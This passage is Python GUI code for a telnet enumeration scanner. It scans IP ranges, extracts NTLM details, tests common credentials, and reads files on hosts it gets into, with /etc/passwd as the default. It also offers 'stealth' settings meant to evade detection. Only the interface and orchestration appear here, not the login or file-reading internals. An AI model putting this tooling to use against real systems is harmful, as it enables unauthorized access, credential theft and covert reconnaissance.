        self.threads_entry.insert(0, "10")
        ttk.Label(main_frame, text="(concurrent connections, 1-50)", font=('Helvetica', 8)).grid(row=3, column=2, sticky=tk.W)
        
        # Options frame for checkboxes
        options_frame = ttk.LabelFrame(main_frame, text="Scan Options", padding="10")
        options_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10, padx=5)
        
        self.extract_ntlm_checkbox = ttk.Checkbutton(
            options_frame, 
            text="Extract NTLM Authentication Details",
            variable=self.extract_ntlm_var
        )
        self.extract_ntlm_checkbox.grid(row=0, column=0, sticky=tk.W, pady=2)
        
        self.test_credentials_checkbox = ttk.Checkbutton(
            options_frame,
            text="Test Common Credentials",
            variable=self.test_credentials_var
        )
        self.test_credentials_checkbox.grid(row=1, column=0, sticky=tk.W, pady=2)
        
        self.view_files_checkbox = ttk.Checkbutton(
            options_frame,
            text="View Files (requires credential testing)",
            variable=self.view_files_var
        )
        self.view_files_checkbox.grid(row=2, column=0, sticky=tk.W, pady=2)
        
        # Auto-scrub checkbox
        self.auto_scrub_checkbox = ttk.Checkbutton(
            options_frame,
            text="  Auto-discover and view files (discovers text/image files through enumeration, up to 100)",
            variable=self.auto_scrub_var
        )
        self.auto_scrub_checkbox.grid(row=3, column=0, sticky=tk.W, pady=2, padx=(20, 0))
        
        # File paths input
        ttk.Label(options_frame, text="  Or specify custom files to view (comma-separated):", 
                 font=('Helvetica', 8)).grid(row=4, column=0, sticky=tk.W, pady=2)
        self.files_entry = ttk.Entry(options_frame, width=60)
        self.files_entry.grid(row=5, column=0, sticky=(tk.W, tk.E), pady=2, padx=(20, 0))
        self.files_entry.insert(0, "/etc/passwd,/etc/hosts")
        
        ttk.Label(options_frame, text="⚠️ Credential testing may trigger security alerts", 
                 font=('Helvetica', 8), foreground='orange').grid(row=6, column=0, sticky=tk.W, pady=2)
        
        # Stealth options
        stealth_frame = ttk.LabelFrame(main_frame, text="Stealth Options (Less Detectable)", padding="10")
        stealth_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10, padx=5)
        
        self.randomize_checkbox = ttk.Checkbutton(
            stealth_frame,
            text="Randomize Scan Order & Source Ports",
            variable=self.randomize_order_var
        )
        self.randomize_checkbox.grid(row=0, column=0, sticky=tk.W, pady=2)
        
        self.jitter_checkbox = ttk.Checkbutton(
            stealth_frame,
            text="Add Random Delays (Jitter: 0.5-2.0 sec)",
            variable=self.use_jitter_var
        )
        self.jitter_checkbox.grid(row=1, column=0, sticky=tk.W, pady=2)
        
        ttk.Label(stealth_frame, text="ℹ️ Stealth options reduce detection but slow down scans", 
                 font=('Helvetica', 8), foreground='blue').grid(row=2, column=0, sticky=tk.W, pady=2)
        
        # Progress bar
        ttk.Label(main_frame, text="Progress:").grid(row=6, column=0, sticky=tk.W, pady=5)
        self.progress_bar = ttk.Progressbar(main_frame, mode='determinate')
        self.progress_bar.grid(row=6, column=1, sticky=(tk.W, tk.E), pady=5, padx=5)
        self.progress_label = ttk.Label(main_frame, text="0/0")
        self.progress_label.grid(row=6, column=2, sticky=tk.W, pady=5)
        
        # Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=7, column=0, columnspan=3, pady=10)
        
        self.scan_button = ttk.Button(button_frame, text="Start Scan", command=self.start_scan)
        self.scan_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="Stop Scan", command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=1, padx=5)
        
        self.clear_button = ttk.Button(button_frame, text="Clear Results", command=self.clear_results)
        self.clear_button.grid(row=0, column=2, padx=5)
        
        self.export_button = ttk.Button(button_frame, text="Export Results", command=self.export_results)
        self.export_button.grid(row=0, column=3, padx=5)
        
        # Results area with tabs
        ttk.Label(main_frame, text="Results:").grid(row=8, column=0, sticky=(tk.W, tk.N), pady=5)
        
        # Create a notebook for tabbed interface
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.grid(row=8, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), 
                          pady=5, padx=5)
        
        # Main results tab
        main_results_frame = ttk.Frame(self.notebook)
        self.notebook.add(main_results_frame, text="Main Results")
        
        self.results_text = scrolledtext.ScrolledText(main_results_frame, width=90, height=25, 
                                                      wrap=tk.WORD, font=('Courier', 9))
        self.results_text.pack(fill=tk.BOTH, expand=True)
        
        # Files viewed tab - Enhanced file/folder/path viewer
        files_viewed_frame = ttk.Frame(self.notebook)
        self.notebook.add(files_viewed_frame, text="Files Viewed")
        
        # Create PanedWindow for split view
        files_paned = ttk.PanedWindow(files_viewed_frame, orient=tk.HORIZONTAL)
        files_paned.pack(fill=tk.BOTH, expand=True)
        
        # Left panel: File tree with search/filter
        left_frame = ttk.Frame(files_paned)
        files_paned.add(left_frame, weight=1)
        
        # Search/Filter controls
        search_frame = ttk.Frame(left_frame)
        search_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(search_frame, text="Filter:").pack(side=tk.LEFT)
        self.file_filter_var = tk.StringVar()
        self.file_filter_var.trace('w', lambda *args: self._debounced_filter())
        filter_entry = ttk.Entry(search_frame, textvariable=self.file_filter_var)
        filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Clear filter button
        ttk.Button(search_frame, text="Clear", width=8, 
                   command=lambda: self.file_filter_var.set("")).pack(side=tk.LEFT)
        
        # Status filter dropdown
        ttk.Label(search_frame, text="Status:").pack(side=tk.LEFT, padx=(10, 0))
        self.status_filter_var = tk.StringVar(value="All")
        status_combo = ttk.Combobox(search_frame, textvariable=self.status_filter_var, 
                                    values=["All", "Success", "Error", "Not Found"], 
                                    state="readonly", width=12)
        status_combo.pack(side=tk.LEFT, padx=5)
        status_combo.bind('<<ComboboxSelected>>', lambda e: self.filter_file_tree())
        
        # Tree frame with scrollbar
        tree_frame = ttk.Frame(left_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # File tree with columns
        columns = ('status', 'size', 'target')
        self.file_tree = ttk.Treeview(tree_frame, columns=columns, show='tree headings')
        
        # Configure columns
        self.file_tree.heading('#0', text='Path', anchor=tk.W)
        self.file_tree.heading('status', text='Status', anchor=tk.CENTER)
        self.file_tree.heading('size', text='Size', anchor=tk.E)
        self.file_tree.heading('target', text='Target', anchor=tk.W)
        
        self.file_tree.column('#0', width=300, minwidth=200)
        self.file_tree.column('status', width=80, minwidth=60)
        self.file_tree.column('size', width=80, minwidth=60)
        self.file_tree.column('target', width=150, minwidth=100)
        
        # Scrollbars for tree
        tree_vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=self.file_tree.yview)
        tree_hsb = ttk.Scrollbar(tree_frame, orient="horizontal", command=self.file_tree.xview)
        self.file_tree.configure(yscrollcommand=tree_vsb.set, xscrollcommand=tree_hsb.set)
        
        # Grid layout for tree and scrollbars
        self.file_tree.grid(row=0, column=0, sticky=(tk.N, tk.S, tk.E, tk.W))
        tree_vsb.grid(row=0, column=1, sticky=(tk.N, tk.S))
        tree_hsb.grid(row=1, column=0, sticky=(tk.E, tk.W))
        tree_frame.rowconfigure(0, weight=1)
        tree_frame.columnconfigure(0, weight=1)
        
        # Configure tags for status colors
        self.file_tree.tag_configure('success', foreground='#006400')  # Dark green
        self.file_tree.tag_configure('error', foreground='#B22222')  # Fire brick red
        self.file_tree.tag_configure('notfound', foreground='#FF8C00')  # Dark orange
        self.file_tree.tag_configure('folder', font=('TkDefaultFont', 9, 'bold'))
        
        # Bind selection event
        self.file_tree.bind('<<TreeviewSelect>>', self.on_file_selected)
        
        # Right panel: File content viewer
        right_frame = ttk.Frame(files_paned)
        files_paned.add(right_frame, weight=2)
        
        # Content header
        content_header = ttk.Frame(right_frame)
        content_header.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(content_header, text="File Content:", 
                  font=('TkDefaultFont', 10, 'bold')).pack(side=tk.LEFT)
        
        self.content_info_label = ttk.Label(content_header, text="Select a file to view", 
                                           foreground='gray')
        self.content_info_label.pack(side=tk.LEFT, padx=10)
        
        # Content viewer with scrollbar
        self.files_text = scrolledtext.ScrolledText(right_frame, width=50, height=25, 
                                                    wrap=tk.WORD, font=('Courier', 9))
        self.files_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, 
                              relief=tk.SUNKEN, anchor=tk.W)
        status_bar.grid(row=9, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(5, 0))
    
    def validate_inputs(self) -> tuple:
        """Validate user inputs"""
        ip_address = self.ip_entry.get().strip()
        
        if not ip_address:
            return False, "IP address is required"
        
        try:
            timeout = float(self.timeout_entry.get().strip())
            if timeout <= 0:
                return False, "Timeout must be greater than 0"
            if timeout > 60:
                return False, "Timeout must be 60 seconds or less"
        except ValueError:
            return False, "Timeout must be a valid number"
        
        try:
            threads = int(self.threads_entry.get().strip())
            if threads < 1:
                return False, "Thread count must be at least 1"
            if threads > 50:
                return False, "Thread count must be 50 or less"
        except ValueError:
            return False, "Thread count must be a valid integer"
        
        return True, None
    
    def start_scan(self):
        """Start the telnet enumeration scan"""
        logger.info("=" * 80)
        logger.info("Starting new scan session")
        logger.info("=" * 80)
        
        valid, error = self.validate_inputs()
        
        if not valid:
            logger.warning(f"Validation failed: {error}")
            self.append_result(f"Error: {error}\n")
            return
        
        if self.is_scanning:
            logger.warning("Scan already in progress")
            messagebox.showwarning("Scan in Progress", "A scan is already running")
            return
        
        # Disable scan button during scan
        self.scan_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.is_scanning = True
        self.status_var.set("Scanning...")
        self.scan_results = []  # Clear previous results
        
        # Get values
        ip_address = self.ip_entry.get().strip()
        port = 23  # Hardcoded for telnet
        timeout = float(self.timeout_entry.get().strip())
        threads = int(self.threads_entry.get().strip())
        
        logger.info(f"Scan configuration: IP={ip_address}, Port={port}, Timeout={timeout}s, Threads={threads}")
        
        # Update enumerator timeout
        self.enumerator.timeout = timeout
        self.enumerator.max_workers = threads
        
        # Get scan options
        extract_ntlm = self.extract_ntlm_var.get()
        test_credentials = self.test_credentials_var.get()
        view_files = self.view_files_var.get()
        auto_scrub = self.auto_scrub_var.get()
        
        logger.info(f"Scan options: NTLM={extract_ntlm}, Credentials={test_credentials}, "
                   f"ViewFiles={view_files}, AutoDiscovery={auto_scrub}")
        
        # Get file paths to view
        files_to_view = []
        if view_files and test_credentials:
            if auto_scrub:
                # Auto-discover mode: will discover files through enumeration
                self.enumerator.auto_scrub_files = True
                self.enumerator.files_to_view = []
                logger.info("File viewing mode: Auto-discovery enabled")
            else:
                # Manual mode: use specified files
                self.enumerator.auto_scrub_files = False
                files_str = self.files_entry.get().strip()
                if files_str:
                    files_to_view = [f.strip() for f in files_str.split(',') if f.strip()]
                self.enumerator.files_to_view = files_to_view
                logger.info(f"File viewing mode: Manual - {len(files_to_view)} files specified")
        else:
            self.enumerator.auto_scrub_files = False
            self.enumerator.files_to_view = []
            logger.info("File viewing: Disabled")
        
        # Get stealth options
        randomize_order = self.randomize_order_var.get()
        use_jitter = self.use_jitter_var.get()
        
        # Configure stealth settings
        self.enumerator.randomize_order = randomize_order
        self.enumerator.randomize_source_port = randomize_order  # Use same control for both
        if use_jitter:
            self.enumerator.jitter_min = 0.5
            self.enumerator.jitter_max = 2.0
        else:
            self.enumerator.jitter_min = 0.0
            self.enumerator.jitter_max = 0.0
        
        logger.info(f"Stealth options: Randomize={randomize_order}, Jitter={use_jitter}")
        
        # Start scan in separate thread
        self.scan_thread = threading.Thread(
            target=self.run_scan,
            args=(ip_address, port, extract_ntlm, test_credentials),
            daemon=True
        )
        self.scan_thread.start()
        logger.info("Scan thread started")
    
    def stop_scan(self):
        """Stop the current scan"""
        self.is_scanning = False
        self.status_var.set("Scan stopped by user")
        self.scan_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
    
    def run_scan(self, ip_address: str, port: int, extract_ntlm: bool, test_credentials: bool):
        """Run the scan in a separate thread with concurrent execution"""
        try:
            results = []
            total_scans = 0
            completed_scans = 0
            
            # Check if it's a CIDR range or single IP
            is_cidr = '/' in ip_address
            
            # Prepare list of IPs to scan
            ips_to_scan = []
            
            if is_cidr:
                # IP range scanning with CIDR
                try:
                    network = ipaddress.ip_network(ip_address, strict=False)
                    # Handle different network sizes including /31 and /32
                    ips_to_scan = [str(ip) for ip in network.hosts()]
                    if not ips_to_scan:  # Handle /31 and /32
                        ips_to_scan = [str(ip) for ip in network]
                except ValueError as e:
                    # Invalid CIDR notation, treat as single IP
                    ips_to_scan = [ip_address]
            else:
                # Single IP scan
                ips_to_scan = [ip_address]
            
            # Randomize order if stealth mode is enabled
            if self.enumerator.randomize_order:
                random.shuffle(ips_to_scan)
            
            total_scans = len(ips_to_scan)
            self.result_queue.put(('progress', 0, total_scans))
            
            # Use ThreadPoolExecutor for concurrent scanning
            with ThreadPoolExecutor(max_workers=self.enumerator.max_workers) as executor:
                # Submit all scan tasks
                future_to_ip = {
                    executor.submit(
                        self.enumerator.check_telnet, 
                        ip, port, extract_ntlm, test_credentials
                    ): ip 
                    for ip in ips_to_scan
                }
                
                # Process completed scans as they finish
                for future in as_completed(future_to_ip):
                    if not self.is_scanning:
                        # Cancel remaining tasks if scan is stopped
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    
                    try:
                        result = future.result()
                        results.append(result)
                        completed_scans += 1
                        self.result_queue.put(('progress', completed_scans, total_scans))
                    except Exception as e:
                        # Log error but continue with other scans
                        ip = future_to_ip[future]
                        error_result = {
                            'ip': ip,
                            'port': port,
                            'status': 'error',
                            'banner': None,
                            'error': str(e),
                            'response_time': None,
                            'encryption_support': None,
                            'ntlm_info': None,
                            'credential_results': None,
                            'timestamp': datetime.now().isoformat()
                        }
                        results.append(error_result)
                        completed_scans += 1
                        self.result_queue.put(('progress', completed_scans, total_scans))
            
            # Send results
            self.result_queue.put(('results', results))
            
        except Exception as e:
            self.result_queue.put(('error', str(e)))
    
    def check_queue(self):
        """Check the result queue for updates"""
        try:
            while True:
                msg_type, *data = self.result_queue.get_nowait()
                
                if msg_type == 'progress':
                    completed, total = data
                    self.progress_bar['maximum'] = total
                    self.progress_bar['value'] = completed
                    self.progress_label.config(text=f"{completed}/{total}")
                    
                elif msg_type == 'results':
                    results = data[0]
                    self.scan_results.extend(results)
                    self.display_results(results)
                    self.scan_button.config(state=tk.NORMAL)
                    self.stop_button.config(state=tk.DISABLED)
                    self.is_scanning = False
                    self.status_var.set(f"Scan complete - {len(results)} target(s) scanned")
                    
                elif msg_type == 'error':
                    self.append_result(f"Error: {data[0]}\n")
                    self.scan_button.config(state=tk.NORMAL)
                    self.stop_button.config(state=tk.DISABLED)
                    self.is_scanning = False
                    self.status_var.set("Error occurred")
                
        except queue.Empty:
            pass
        
        # Schedule next check
        self.root.after(100, self.check_queue)
    
    def display_results(self, results: List[dict]):
        """Display scan results with detailed information"""
        # Summary header
        total = len(results)
        open_count = sum(1 for r in results if r['status'] == 'open')
        closed_count = sum(1 for r in results if r['status'] == 'closed')
        timeout_count = sum(1 for r in results if r['status'] == 'timeout')
        error_count = sum(1 for r in results if r['status'] == 'error')
        
        output = []
        output.append("\n" + "=" * 80)
        output.append("TELNET ENUMERATION SCAN RESULTS")
        output.append("=" * 80)
        output.append(f"Scan Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        output.append(f"Total Targets:  {total}")
        output.append(f"Open Ports:     {open_count}")
        output.append(f"Closed Ports:   {closed_count}")
        output.append(f"Timeouts:       {timeout_count}")
        output.append(f"Errors:         {error_count}")
        output.append("=" * 80)
        output.append("")
        
        # Detailed results
        for idx, result in enumerate(results, 1):
            output.append(f"\n[Target {idx}/{total}]")
            output.append("-" * 80)
            output.append(f"IP Address:      {result['ip']}")
            output.append(f"Port:            {result['port']}")
            output.append(f"Status:          {result['status'].upper()}")
            output.append(f"Timestamp:       {result['timestamp']}")
            
            if result['response_time'] is not None:
                output.append(f"Response Time:   {result['response_time']} ms")
            
            # Display encryption support information
            if result.get('encryption_support'):
                enc_status = result['encryption_support']
                if enc_status == 'supported':
                    output.append(f"Encryption:      🔒 SUPPORTED")
                elif enc_status == 'not_supported':
                    output.append(f"Encryption:      ⚠️ NOT SUPPORTED")
                else:
                    output.append(f"Encryption:      ❓ UNKNOWN")
            
            # Display NTLM information if available
            if result.get('ntlm_info'):
                output.append("\n🔐 NTLM Authentication Details:")
                output.append("." * 80)
                ntlm_info = result['ntlm_info']
                
                if ntlm_info.get('message_type'):
                    output.append(f"  Message Type:    {ntlm_info['message_type']}")
                if ntlm_info.get('target_name'):
                    output.append(f"  Target Name:     {ntlm_info['target_name']}")
                if ntlm_info.get('challenge'):
                    output.append(f"  Challenge:       {ntlm_info['challenge']}")
                if ntlm_info.get('flags'):
                    output.append(f"  Flags:           {ntlm_info['flags']}")
                if ntlm_info.get('version'):
                    output.append(f"  Version:         {ntlm_info['version']}")
                
                output.append("." * 80)
            
            # Display credential test results if available
            if result.get('credential_results'):
                output.append("\n✅ SUCCESSFUL CREDENTIAL TESTS:")
                output.append("." * 80)
                for cred in result['credential_results']:
                    output.append(f"  Username:        {cred['username']}")
                    output.append(f"  Password:        {cred['password']}")
                    if cred.get('response'):
                        output.append(f"  Response:        {cred['response'][:100]}...")
                    
                    # Display summary of viewed files if available
                    if cred.get('files_viewed'):
                        num_files = len(cred['files_viewed'])
                        num_success = sum(1 for f in cred['files_viewed'] if f.get('content'))
                        num_errors = sum(1 for f in cred['files_viewed'] if f.get('error'))
                        num_not_found = sum(1 for f in cred['files_viewed'] if f.get('error') and 
                                          ('not found' in f.get('error', '').lower() or 
                                           'no such file' in f.get('error', '').lower()))
                        
                        output.append(f"\n  📄 FILES VIEWED: {num_success}/{num_files} files successfully read")
                        if num_not_found > 0:
                            output.append(f"     ⚠️  {num_not_found} file(s) not found")
                        if num_errors - num_not_found > 0:
                            output.append(f"     ❌ {num_errors - num_not_found} file(s) had errors")
                        output.append(f"     (See 'Files Viewed' tab for full content and details)")
                        
                        # Log the file viewing summary
                        logger.info(f"Files viewed for {result['ip']}:{result['port']} - "
                                  f"Success: {num_success}, Not Found: {num_not_found}, "
                                  f"Errors: {num_errors - num_not_found}")
                        
                        # Store file data for the Files Viewed tab
                        for file_info in cred['files_viewed']:
                            file_data = {
                                'ip': result['ip'],
                                'port': result['port'],
                                'username': cred['username'],
                                'password': cred['password'],
                                'timestamp': result['timestamp'],
                                'file_info': file_info
                            }
                            self.files_viewed_data.append(file_data)
                    
                    if cred.get('file_view_error'):
                        output.append(f"  File View Error: {cred['file_view_error']}")
                    
                    output.append("  " + "-" * 76)
                output.append("." * 80)
            
            if result['status'] == 'open':
                output.append("")
                output.append("✓ PORT IS OPEN")
                
                if result['banner']:
                    output.append("\nBanner Information:")
                    output.append("." * 80)
                    # Split banner into lines for better display
                    banner_lines = result['banner'].split('\n')
                    for line in banner_lines[:self.MAX_BANNER_LINES]:
                        output.append(f"  {line}")
                    if len(banner_lines) > self.MAX_BANNER_LINES:
                        output.append(f"  ... ({len(banner_lines) - self.MAX_BANNER_LINES} more lines)")
                    output.append("." * 80)
                else:
                    output.append("\nNo banner received (service may not send initial banner)")
                    
            elif result['status'] == 'closed':
                output.append("\n✗ PORT IS CLOSED")
            elif result['status'] == 'timeout':
                output.append("\n⚠ CONNECTION TIMED OUT")
            elif result['status'] == 'error':
                output.append(f"\n✗ ERROR OCCURRED")
            
            if result['error']:
                output.append(f"\nError Details: {result['error']}")
            
            output.append("-" * 80)
        
        output.append("\n" + "=" * 80)
        output.append(f"Scan completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        output.append("=" * 80)
        output.append("")
        
        self.append_result("\n".join(output))
        
        # Update the Files Viewed tab if any files were viewed
        self.update_files_tab()
    
    def update_files_tab(self):
        """Update the Files Viewed tab with hierarchical file tree and content viewer"""
        # Clear existing tree
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)
        
        # Clear the file data map to prevent stale item ID references
        self._file_data_map.clear()
        
        # Clear content viewer
        self.files_text.delete(1.0, tk.END)
        self.content_info_label.config(text="Select a file to view")
        
        if not self.files_viewed_data:
            self.files_text.insert(tk.END, "No files have been viewed yet.\n\n")
            self.files_text.insert(tk.END, "Enable 'View Files' and 'Test Common Credentials' options\n")
            self.files_text.insert(tk.END, "to automatically view files when valid credentials are found.\n\n")
            self.files_text.insert(tk.END, "Tip: Enable 'Auto-discover files' to automatically find and view files\n")
            self.files_text.insert(tk.END, "on the target system, or specify custom file paths to view.")
            logger.debug("Files Viewed tab updated - no files to display")
            return
        
        # Store unfiltered data
        self.unfiltered_file_data = list(self.files_viewed_data)
        
        # Calculate statistics
        total_files = len(self.files_viewed_data)
        successful = sum(1 for f in self.files_viewed_data if f['file_info'].get('content'))
        errors = sum(1 for f in self.files_viewed_data if f['file_info'].get('error'))
        
        logger.info(f"Files Viewed tab updated - Total: {total_files}, Success: {successful}, Errors: {errors}")
        
        # Build hierarchical tree structure
        self._populate_file_tree(self.files_viewed_data)
    
    def _populate_file_tree(self, file_data_list):
        """Populate the file tree with hierarchical structure"""
        # Group files by target and directory
        tree_structure = {}
        
        for file_data in file_data_list:
            target = f"{file_data['ip']}:{file_data['port']}"
            file_path = file_data['file_info']['path']
            
            # Initialize target if not exists
            if target not in tree_structure:
                tree_structure[target] = {}
            
            # Parse file path into directory components
            if file_path.startswith('/'):
                # Unix-like path
                parts = file_path.split('/')
            elif len(file_path) > 2 and file_path[1] == ':':
                # Windows path
                parts = file_path.replace('\\', '/').split('/')
            else:
                # Relative path
                parts = file_path.replace('\\', '/').split('/')
            
            # Build nested structure
            current_level = tree_structure[target]
            for i, part in enumerate(parts[:-1]):
                if part == '':
                    part = '/' if i == 0 else part
                if part not in current_level:
                    current_level[part] = {}
                current_level = current_level[part]
            
            # Add the file at the leaf
            filename = parts[-1]
            current_level[filename] = file_data
        
        # Populate tree widget
        for target, dirs in sorted(tree_structure.items()):
            # Add target as root node
            target_node = self.file_tree.insert('', 'end', text=target, 
                                                tags=('folder',), open=True)
            self._add_tree_nodes(target_node, dirs)
    
    def _add_tree_nodes(self, parent, structure):
        """Recursively add nodes to the tree"""
        for name, content in sorted(structure.items()):
            if isinstance(content, dict) and not content.get('file_info'):
                # This is a directory
                node = self.file_tree.insert(parent, 'end', text=name, 
                                            tags=('folder',), open=False)
                self._add_tree_nodes(node, content)
            else:
                # This is a file
                file_info = content['file_info']
                
                # Determine status
                if file_info.get('content'):
                    status = '✓ Success'
                    status_tag = 'success'
                    size = f"{file_info.get('size', 0)} B"
                elif file_info.get('error'):
                    if 'not found' in file_info['error'].lower() or 'no such file' in file_info['error'].lower():
                        status = '✗ Not Found'
                        status_tag = 'notfound'
                    else:
                        status = '✗ Error'
                        status_tag = 'error'
                    size = '-'
                else:
                    status = '? Unknown'
                    status_tag = 'error'
                    size = '-'
                
                target_str = f"{content['ip']}:{content['port']}"
                
                # Insert file node with data
                node = self.file_tree.insert(parent, 'end', text=name,
                                            values=(status, size, target_str),
                                            tags=(status_tag,))
                # Store file data in item for retrieval on selection
                self.file_tree.set(node, '#0', name)
                # Store the full file data for retrieval on selection
                self._file_data_map[node] = content
    
    def on_file_selected(self, event):
        """Handle file selection in tree"""
        selection = self.file_tree.selection()
        if not selection:
            return
        
        item_id = selection[0]
        
        # Check if this is a file (not a folder)
        if not hasattr(self, '_file_data_map') or item_id not in self._file_data_map:
            # It's a folder, clear content
            self.files_text.delete(1.0, tk.END)
            self.files_text.insert(tk.END, "Select a file to view its content.")
            self.content_info_label.config(text="Folder selected")
            return
        
        file_data = self._file_data_map[item_id]
        file_info = file_data['file_info']
        
        # Update content viewer
        self.files_text.delete(1.0, tk.END)
        
        # Display file metadata
        output = []
        output.append("=" * 80)
        output.append("FILE DETAILS")
        output.append("=" * 80)
        output.append(f"Target:          {file_data['ip']}:{file_data['port']}")
        output.append(f"Credentials:     {file_data['username']}:{file_data['password']}")
        output.append(f"Timestamp:       {file_data['timestamp']}")
        output.append(f"File Path:       {file_info['path']}")
        
        if file_info.get('content'):
            output.append(f"File Size:       {file_info.get('size', 0)} bytes")
            output.append(f"Status:          ✓ Successfully retrieved")
            output.append("=" * 80)
            output.append("\nFILE CONTENT:")
            output.append("-" * 80)
            output.append(file_info['content'])
            output.append("-" * 80)
            
            self.content_info_label.config(
                text=f"{file_info['path']} ({file_info.get('size', 0)} bytes)",
                foreground='green'
            )
        elif file_info.get('error'):
            output.append(f"Status:          ✗ Error")
            output.append(f"Error Message:   {file_info['error']}")
            output.append("=" * 80)
            
            self.content_info_label.config(
                text=f"{file_info['path']} - Error",
                foreground='red'
            )
        else:
            output.append(f"Status:          ? Unknown")
            output.append("=" * 80)
            
            self.content_info_label.config(
                text=f"{file_info['path']} - Unknown status",
                foreground='orange'
            )
        
        self.files_text.insert(tk.END, "\n".join(output))
        self.files_text.see(1.0)
    
    def _debounced_filter(self):
        """Debounce filter updates to avoid performance issues with large file lists"""
        # Cancel pending filter update if exists
        if self._filter_after_id is not None:
            self.root.after_cancel(self._filter_after_id)
        
        # Schedule new filter update after 300ms delay
        self._filter_after_id = self.root.after(300, self.filter_file_tree)
    
    def filter_file_tree(self):
        """Filter the file tree based on search text and status"""
        filter_text = self.file_filter_var.get().lower()
        status_filter = self.status_filter_var.get()
        
        # Apply filters to the data
        filtered_data = []
        for file_data in self.unfiltered_file_data:
            file_path = file_data['file_info']['path']
            file_info = file_data['file_info']
            
            # Check text filter
            if filter_text and filter_text not in file_path.lower():
                continue
            
            # Check status filter
            if status_filter != "All":
                if status_filter == "Success" and not file_info.get('content'):
                    continue
                elif status_filter == "Error":
                    if not file_info.get('error'):
                        continue
                    if 'not found' in file_info.get('error', '').lower():
                        continue
                elif status_filter == "Not Found":
                    if not file_info.get('error'):
                        continue
                    if 'not found' not in file_info.get('error', '').lower():
                        continue
            
            filtered_data.append(file_data)
        
        # Clear and repopulate tree
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)
        
        if not hasattr(self, '_file_data_map'):
            self._file_data_map = {}
        else:
            self._file_data_map.clear()
        
        if filtered_data:
            self._populate_file_tree(filtered_data)
        else:
            # Show "no results" message in content viewer
            self.files_text.delete(1.0, tk.END)
            self.files_text.insert(tk.END, "No files match the current filter.")
            self.content_info_label.config(text="No matching files")
    
    
    def append_result(self, text: str):
        """Append text to results area"""
        self.results_text.insert(tk.END, text + "\n")
        self.results_text.see(tk.END)
    
    def clear_results(self):
        """Clear the results text area"""
        self.results_text.delete(1.0, tk.END)
        self.files_text.delete(1.0, tk.END)
        self.scan_results = []
        self.files_viewed_data = []
        self.unfiltered_file_data = []
        self._file_data_map.clear()
        
        # Clear the file tree
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)
        
        self.progress_bar['value'] = 0
        self.progress_label.config(text="0/0")
        self.status_var.set("Ready")
        self.content_info_label.config(text="Select a file to view")
        self.update_files_tab()  # Reset the files tab to show "no files" message
    
    def export_results(self):
        """Export scan results to file"""
        if not self.scan_results:
            messagebox.showinfo("No Results", "No scan results to export")
            return
        
        # Ask user for export format
        export_window = tk.Toplevel(self.root)
        export_window.title("Export Results")
        export_window.geometry("300x150")
        export_window.transient(self.root)
        export_window.grab_set()
        
        ttk.Label(export_window, text="Select export format:", 
                 font=('Helvetica', 12, 'bold')).pack(pady=20)
        
        button_frame = ttk.Frame(export_window)
        button_frame.pack(pady=10)
        
        def export_csv():
            export_window.destroy()
            self._export_to_csv()
        
        def export_json():
            export_window.destroy()
            self._export_to_json()
        
        def export_txt():
            export_window.destroy()
            self._export_to_txt()
        
        ttk.Button(button_frame, text="CSV", command=export_csv, width=10).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="JSON", command=export_json, width=10).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="TXT", command=export_txt, width=10).pack(side=tk.LEFT, padx=5)
    
    def _export_to_csv(self):
        """Export results to CSV file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")],
            initialfile=f"telnet_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        )
        
        if filename:
            try:
                with open(filename, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['IP Address', 'Port', 'Status', 'Response Time (ms)', 
                                   'Encryption Support', 'Banner', 'NTLM Info', 'Successful Credentials', 'Files Viewed', 'Error', 'Timestamp'])
                    for result in self.scan_results:
                        # Format NTLM info
                        ntlm_str = 'N/A'
                        if result.get('ntlm_info'):
                            ntlm_parts = []
                            for key, value in result['ntlm_info'].items():
                                ntlm_parts.append(f"{key}={value}")
                            ntlm_str = "; ".join(ntlm_parts)
                        
                        # Format credential results
                        cred_str = 'N/A'
                        files_str = 'N/A'
                        if result.get('credential_results'):
                            cred_parts = []
                            file_parts = []
                            for cred in result['credential_results']:
                                cred_parts.append(f"{cred['username']}:{cred['password']}")
                                # Add file viewing info
                                if cred.get('files_viewed'):
                                    for file_info in cred['files_viewed']:
                                        if file_info.get('content'):
                                            file_parts.append(f"{file_info['path']} ({file_info.get('size', 0)} bytes)")
                                        else:
                                            file_parts.append(f"{file_info['path']} (error)")
                            cred_str = "; ".join(cred_parts)
                            if file_parts:
                                files_str = "; ".join(file_parts)
                        
                        writer.writerow([
                            result['ip'],
                            result['port'],
                            result['status'],
                            result.get('response_time', 'N/A'),
                            result.get('encryption_support', 'N/A'),
                            result.get('banner', 'N/A'),
                            ntlm_str,
                            cred_str,
                            files_str,
                            result.get('error', 'N/A'),
